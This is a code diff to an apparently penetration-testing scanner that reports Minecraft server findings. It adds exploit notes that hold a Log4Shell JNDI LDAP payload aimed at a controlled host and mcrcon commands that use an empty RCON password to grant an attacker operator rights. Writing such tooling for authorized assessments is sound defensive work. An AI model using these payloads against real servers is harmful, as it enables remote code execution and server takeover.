@@ -478,10 +478,12 @@ def minecraft_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "mcstatus", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -517,7 +519,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "-Dlog4j2.formatMsgNoLookups=true on 2.10-2.14; the "
                     "log4j2_112-2.xml patch for 1.7-1.11.2; the client-side "
                     "log4j2_17-111.xml for 1.12-1.16.5), or upgrade to 1.18.1+.",
-                    ["CWE-502", "CWE-20"], kind="minecraft_log4shell"))
+                    ["CWE-502", "CWE-20"], kind="minecraft_log4shell",
+                    exploit_note=(
+                        "# ROE-required: connect with a real MC client, "
+                        "send chat containing ${jndi:ldap://"
+                        "<controlled-host>/x}; watch controlled LDAP for "
+                        "JNDI lookup. On unpatched servers this is "
+                        "instant RCE."),
+                    depth_tier="t1"))
 
             sample = pr.get("players_sample") or []
             if sample:
@@ -571,7 +580,14 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "Set a strong `rcon.password` in server.properties, "
                         "or disable RCON (`enable-rcon=false`) and restrict "
                         "25575/tcp to management-only networks.",
-                        ["CWE-521", "CWE-798"], kind="minecraft_rcon_open"))
+                        ["CWE-521", "CWE-798"], kind="minecraft_rcon_open",
+                        exploit_note=(
+                            f"mcrcon -H {h.ip} -p '' -P {_RCON_DEFAULT_PORT} "
+                            f"list  ; mcrcon -H {h.ip} -p '' -P "
+                            f"{_RCON_DEFAULT_PORT} 'op <attacker>' ; mcrcon "
+                            f"-H {h.ip} -p '' -P {_RCON_DEFAULT_PORT} "
+                            "'save-all' -- ROE-required."),
+                        depth_tier="t2"))
                 else:
                     out.append(_finding(
                         "medium",
